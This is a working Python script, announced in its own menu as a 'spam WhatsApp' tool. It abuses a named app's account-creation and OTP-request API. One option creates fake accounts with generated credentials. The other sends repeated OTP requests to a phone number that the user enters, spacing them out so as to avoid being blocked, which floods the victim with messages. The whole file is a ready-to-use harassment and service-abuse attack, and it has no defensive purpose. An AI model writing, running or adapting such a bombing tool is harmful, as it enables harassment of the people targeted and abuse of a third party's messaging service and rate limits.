import subprocess
import sys
import socket
import random
import requests
import string
import json
import time

def install_required_libraries():
    """Install required libraries with better error handling"""
    required_libs = ["requests"]
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            print(f"Installing {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

def check_internet_connection():
    """Check internet connection with timeout"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        print("Error: No internet connection")
        return False

# Initialize
install_required_libraries()
if not check_internet_connection():
    sys.exit(1)

class UserGenerator:
    """Generate random user data for testing purposes"""
    
    def __init__(self):
        self.names = ["Ahmad", "Mohamed", "Ali", "Youssef", "Omar", "Ibrahim", "Khaled","Mahmoud", "Hussein", "Hassan", "Mustafa", "Saeed", "Karim", "Malek","Marwan", "Tamer", "Shady", "Salem", "Fares", "Mohanad", "Ramy","Amr", "Momen", "Ziad", "Fahd", "Badr", "Nasser", "Sami", "Adel","Jamal", "Waleed", "Hatem", "Tariq", "Hani", "Sami", "Maher","Ayman", "Nabil", "Sherif", "Emad", "Fadi", "Wael", "Hisham","Fatima", "Mariam", "Zainab", "Sarah", "Noor", "Laila", "Hind","Reem", "Jana", "Rawan", "Malak", "Maha", "Amal", "Yara","Joud", "Salma", "Nadia", "Mona", "Hanan", "Hala", "Aisha","Sama", "Dalia", "Lama", "Nermeen", "Maisaa", "Nourhan", "Safaa","Yasmin", "Layla", "Iman", "Sawsan", "Rania", "Nada", "Dina","Farah", "Ghada", "Heba", "Soha", "Tahani", "Shereen", "Kamila"]
        self.special_chars = ['!', '#', '@', '$', '%', '&']
    
    def generate_name(self):
        return random.choice(self.names)
    
    def generate_password(self, name):
        random_number = random.randint(0, 10000)
        random_char = random.choice(self.special_chars)
        return f"{name}{random_char}{random_number}"
    
    def generate_email(self):
        characters = string.ascii_lowercase + string.digits
        username_length = random.randint(8, 15)
        username = ''.join(random.choice(characters) for _ in range(username_length))
        return f"{username}@gmail.com"

class APIClient:
    """API client with proper error handling"""
    
    def __init__(self):
        self.base_url = "https://api.walla3t.app/api"
        self.headers = {
            'User-Agent': "okhttp/4.9.2",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'cache-control': "no-cache"
        }
    
    def create_account(self, email, name, password):
        """Create account with proper error handling"""
        url = f"{self.base_url}/create-customer"
        payload = {
            "email": email,
            "full_name": name,
            "password": password,
            "gender": "Male",
            "age_period": "15 - 20"
        }
        
        try:
            response = requests.post(url, data=json.dumps(payload), 
                                   headers=self.headers, timeout=10)
            return response.json()
        except requests.exceptions.RequestException as e:
            return {"status": "error", "message": str(e)}
    
    def request_otp(self, email, phone_number):
        """Request OTP with rate limiting"""
        url = f"{self.base_url}/request-otp"
        payload = {
            "email": email,
            "mobile": f"+2{phone_number}"
        }
        
        try:
            response = requests.post(url, data=json.dumps(payload), 
                                   headers=self.headers, timeout=10)
            return response.json()
        except requests.exceptions.RequestException as e:
            return {"status": "error", "message": str(e)}

def main():
    user_gen = UserGenerator()
    api_client = APIClient()
    
    while True:
        print("\n" + "-"*20)
        print(" WELCOME TO SCRIPT SPAM WHATSAPP ! ")
        print(" 1 - Creat user ")
        print(" 2 - Spam Whatsapp User ")
        print("-"*20)
        
        ask = input(" Enter : ").strip()
        
        if ask == '1':
            # Generate random data
            random_name = user_gen.generate_name()
            random_password = user_gen.generate_password(random_name)
            random_email = user_gen.generate_email()
            
            print(f"Random Name: {random_name}")
            print(f"Random Password: {random_password}")
            print(f"Random Email: {random_email}")
            
            number = input(" Enter number : ").strip()
            
            # Create account
            response = api_client.create_account(random_email, random_name, random_password)
            if response.get("status") == "success":
                print(" Done Creat Account .")
            else:
                print(f" Error creating account: {response}")
            
            # Request OTP once
            response2 = api_client.request_otp(random_email, number)
            print(f"OTP Response: {response2}")
            
            print(f" Your data is : {random_email} , {random_password}")
            
        elif ask == '2':
            email = input(" Enter email : ").strip()
            print("-"*20)
            num = input(" Enter number : ").strip()
            print("-"*20)
            num_spam = int(input(" Enter number of spam (عدد الرسائل): ").strip())
            print("-"*20)
            
            successful_messages = 0
            failed_messages = 0
            
            for x in range(num_spam):
                response = api_client.request_otp(email, num)
                if response.get("status") == "success":
                    successful_messages += 1
                    print(f" Message {x+1}/{num_spam} : Sent successfully ✓")
                else:
                    failed_messages += 1
                    print(f" Message {x+1}/{num_spam} : Failed ✗ - {response}")
                
                # Add small delay to avoid being blocked
                time.sleep(1)
            
            print("\n" + "="*40)
            print(f" SUMMARY:")
            print(f" Successful messages: {successful_messages}")
            print(f" Failed messages: {failed_messages}")
            print(f" Total sent: {successful_messages + failed_messages}")
            print("="*40)
            
        else:
            print("تم غلق الاسكربت")
            break

if __name__ == "__main__":
    main()